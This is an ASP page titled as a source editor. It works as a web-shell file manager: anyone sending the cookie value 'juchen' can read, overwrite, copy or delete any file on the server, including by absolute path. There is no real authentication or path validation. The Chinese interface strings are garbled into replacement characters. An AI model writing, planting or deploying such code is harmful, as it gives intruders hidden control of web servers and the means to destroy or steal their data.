<html>

<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb_2312-80">
<title>�༭Դ����</title>
<style>
<!--
table{ font-family: ����; font-size: 12pt }
a{ font-family: ����; font-size: 12pt; color: rgb(0,32,64); text-decoration: none }
a:hover{ font-family: ����; color: rgb(255,0,0); text-decoration: underline }
a:visited{ color: rgb(128,0,0) }
-->
</style>
</head>

<body>
<% '���ļ�
if Request.Cookies("password")="juchen" then 
if request("op")="del"  then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.Delete True
Response.write "<b>ɾ���ɹ�</b>��Ҫˢ�²��ܿ���Ч���������<a href='javascript:window.close();'>�رձ�����</a>��"
else
if request("op")="copy" then
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if 
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.copy dsfile
Response.write "<p><b>Դ�ļ���</b>"+whichfile
Response.write "<b><br>Ŀ���ļ���</b>"+dsfile
Response.write "<br><b>���Ƴɹ���Ҫˢ�²��ܿ���Ч����</b>�����<a href='javascript:window.close();'>�رձ�����</a>��</p>"
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
Set fs = CreateObject("Scripting.FileSystemObject")
 Set thisfile = fs.OpenTextFile(whichfile, 1, False)
 counter=0
 thisline=htmlencode2(thisfile.readall)
 thisfile.Close
 set fs=nothing
end if
%>

<form method="POST" action="edit.asp">
  <input type="hidden" name="attrib" value="<%=Request("attrib")%>"><table border="0"
  width="700" cellpadding="0">
    <tr>
      <td width="100%" bgcolor="#FFDBCA"><div align="center"><center><p>������ά����</td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA">�ļ�����<input type="text" name="path" size="45"
      value="<%=Request("path")%> ">ֱ�Ӹ����ļ������൱�ڡ����Ϊ��</td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA"><textarea rows="25" name="text" cols="90"><%=thisline%></textarea></td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA"><div align="center"><center><p><input type="submit"
      value="�ύ" name="B1"><input type="reset" value="��ԭ" name="B2"></td>
    </tr>
  </table>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
 Set fs = CreateObject("Scripting.FileSystemObject")
 Set outfile=fs.CreateTextFile(whichfile)
 outfile.WriteLine Request("text")
 outfile.close 
 set fs=nothing
Response.write "�޸ĳɹ��������<a href='javascript:window.close();'>�رձ�����,ˢ�¼��ɿ���</a>��"
end if
end if
end if
else
response.write "�Բ���!��������Ѿ�ʧЧ��������������룬�뷵������"
response.write "<a href='index.asp'>���� �ء�</a>"
end if

function htmlencode2(str)
 dim result
 dim l
 if isNULL(str) then 
 htmlencode2=""
 exit function
 end if
 l=len(str)
 result=""
	dim i
	for i = 1 to l
	 select case mid(str,i,1)
	 case "<"
	 result=result+"&lt;"
	 case ">"
	 result=result+"&gt;"
	 case chr(34)
	 result=result+"&quot;"
	 case "&"
	 result=result+"&amp;"
	 case else
	 result=result+mid(str,i,1)
 end select
 next 
 htmlencode2=result
end function
%>
</body>
</html>




